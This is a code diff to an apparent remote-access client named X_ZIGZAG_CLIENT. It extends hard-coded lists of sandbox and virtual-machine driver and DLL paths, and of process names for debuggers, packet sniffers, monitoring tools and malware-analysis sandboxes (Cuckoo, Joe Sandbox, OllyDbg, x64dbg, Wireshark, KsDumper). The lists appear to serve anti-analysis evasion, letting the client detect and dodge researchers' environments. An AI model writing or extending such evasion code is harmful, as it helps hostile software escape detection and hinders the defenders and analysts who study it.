@@ -50,29 +50,64 @@ namespace X_ZIGZAG_CLIENT
             "C:\\windows\\sysnative\\drivers\\cuckoo.sys",
             "C:\\windows\\system32\\drivers\\cuckoo.sys",
             "C:\\windows\\sysnative\\drivers\\zenbox.sys",
-            "C:\\windows\\system32\\drivers\\zenbox.sys"
-        };
+            "C:\\windows\\system32\\drivers\\zenbox.sys",
+            "C:\\windows\\system32\\vmGuestLib.dll",
+            "C:\\windows\\system32\\vm3dgl.dll",
+            "C:\\windows\\system32\\vboxhook.dll",
+            "C:\\windows\\system32\\vboxmrxnp.dll",
+            "C:\\windows\\system32\\vmsrvc.dll",
+            "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+
+    };
         private static readonly string[] selectedProcessList =
            {
-    "processhacker",
-    "netstat",
-    "netmon",
-    "tcpview",
-    "wireshark",
-    "filemon",
-    "regmon",
-    "cain",
-    "procmon",
-    "sysinternals",
-    "nagios",
-    "zabbix",
-    "solarwinds",
-    "prtg",
-    "splunk",
-    "kismet",
-    "nmap",
-    "ettercap"
-};
+            "processhacker",
+            "netstat",
+            "netmon",
+            "tcpview",
+            "wireshark",
+            "filemon",
+            "regmon",
+            "cain",
+            "procmon",
+            "sysinternals",
+            "nagios",
+            "zabbix",
+            "solarwinds",
+            "prtg",
+            "splunk",
+            "kismet",
+            "nmap",
+            "ettercap",
+            "vmtoolsd",
+            "vmwaretray",
+            "vmwareuser",
+            "fakenet",
+            "dumpcap",
+            "httpdebuggerui",
+            "wireshark",
+            "fiddler",
+            "vboxservice",
+            "df5serv",
+            "vboxtray",
+            "vmwaretray",
+            "ida64",
+            "ollydbg",
+            "pestudio",
+            "vgauthservice",
+            "vmacthlp",
+            "x96dbg",
+            "x32dbg",
+            "prl_cc",
+            "prl_tools",
+            "xenservice",
+            "qemu-ga",
+            "joeboxcontrol",
+            "ksdumperclient",
+            "ksdumper",
+            "joeboxserver"
+}
+;
         private static readonly string[] rdpProcesses =
         {
             "mstsc", "rdpclip", "conhost"
@@ -353,7 +388,6 @@ namespace X_ZIGZAG_CLIENT
             }
             catch (ManagementException)
             {
-                //Console.WriteLine($"An error occurred while querying for WMI data: {e.Message}");
             }
 
             return isECCSupported;
